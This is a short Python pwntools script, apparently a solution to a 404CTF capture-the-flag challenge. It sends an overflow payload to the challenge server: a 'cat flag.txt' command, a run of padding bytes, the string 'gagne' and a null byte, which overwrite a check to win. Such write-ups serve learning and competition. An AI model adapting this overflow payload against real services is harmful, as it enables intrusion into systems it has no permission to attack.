from pwn import *

host='challenges.404ctf.fr'
port=31958

usr_input=b'cat flag.txt '
padding=b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
data2win=b'gagne'
null_byte=b'\x00'
payload=usr_input+padding+data2win+null_byte

r = remote(host, port)
print(r.recvuntil(b'Pour pouvoir participer, nous avons besoin de votre pseudo :\n'))
r.sendline(payload)
print(r.recv())
